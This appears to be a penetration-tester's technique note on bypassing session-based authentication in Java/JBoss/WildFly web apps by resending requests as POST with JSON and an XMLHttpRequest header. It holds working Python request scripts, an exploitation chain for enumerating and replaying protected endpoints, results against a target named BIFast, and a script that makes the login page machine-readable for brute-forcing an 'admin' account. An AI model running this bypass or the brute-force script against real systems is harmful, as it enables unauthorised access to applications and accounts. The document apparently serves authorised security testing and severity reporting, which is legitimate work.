# XHR JSON Auth Bypass on Java/JBoss Platforms

## Discovery (BIFast, June 2026)

Java app servers (JBoss/WildFly with JSP) that enforce session-based auth via 302 redirects on GET requests may handle POST+JSON+XHR differently. The XmlHttpRequest error handler bypasses the session redirect and forwards requests directly to the application layer.

## Trigger Conditions

- Target returns 302 redirect to login for all unauthenticated GET requests
- Backend is Java (JSP/2.3, JBoss, WildFly, or similar)
- Application uses AngularJS/ExtJS SPA with XHR-based API calls internally

## Technique

When a GET to a protected endpoint returns 302 → login:

```python
import requests

# Normal GET — blocked (302 to login)
r = requests.get("https://target/protected/endpoint", verify=False, allow_redirects=False)
# → 302 Location: /login

# POST + JSON + XHR header — BYPASSES session gate
r = requests.post("https://target/protected/endpoint",
    json={"test": "x"},
    headers={
        "X-Requested-With": "XMLHttpRequest",
        "Content-Type": "application/json"
    },
    verify=False, allow_redirects=False)
# → 400/403/500 JSON response (reaches application layer!)
```

## What to look for in responses

| Response | Meaning |
|----------|---------|
| 400 + JSON error (field validation) | Endpoint processes request unauthenticated |
| 403 + JSON `{"success":false,"description":"Error redirect..."}` | App-layer deny (past session gate but auth check inside app) |
| 500 + `exceptionType` field | Backend processing, exception leaked |
| 200 + `{"success":true}` | Full bypass — data returned |

## Key indicators in error responses

- `"exceptionType": "class java.io.IOException"` — Java class leaked
- `"description": "Error redirect from application for XmlHttpRequest"` — confirms XHR handler is separate from session handler
- `"statusCode": "403"` vs `"500"` — differentiates app-deny from processing-error

## Exploitation chain

1. Enumerate all auth-gated paths (Phase 3 output)
2. Replay each as POST+JSON+XHR
3. Filter responses: 400/403/500 with JSON body = reached app layer
4. For 400 responses: analyze error to determine correct request format
5. For 500 responses: check if exceptionType reveals internal details
6. For endpoints that process requests (400 with validation errors): attempt to provide valid request body

## BIFast results

- 8/43 auth-gated endpoints reachable via this bypass
- AuthenticationFactorVerify: 400 `minimum_one_factor_required` (processes auth requests!)
- OAuth preauthorize: 500 with IOException (processes OAuth flow)
- 5 OAuth endpoints: 403 (app-layer deny, still useful for error format disclosure)

## Also test: doLogin with XHR

The login endpoint itself may return JSON `{"success":true/false}` when XHR header is present instead of 302 redirects. This enables machine-parseable brute-force:

```python
s = requests.Session()
s.verify = False
s.get("https://target/login")  # get session
# ... get CSRF token from init ...
r = s.post("https://target/doLogin",
    data={"loginUser": "admin", "loginPwdId": "test", ...},
    headers={"X-Requested-With": "XMLHttpRequest"},
    allow_redirects=False)
# Returns: {"success": false, "uiErrors": {...}} instead of 302
```

## Severity assessment

- Endpoint reaches app layer + processes requests without auth = High (access control bypass)
- Endpoint reaches app layer but returns 403 = Medium (information disclosure + defense-in-depth failure)
- Only error format disclosed, no processing = Low (info only)
- If no valid creds proven and endpoint returns 500 for all inputs = downgrade to Medium (can't prove real impact)
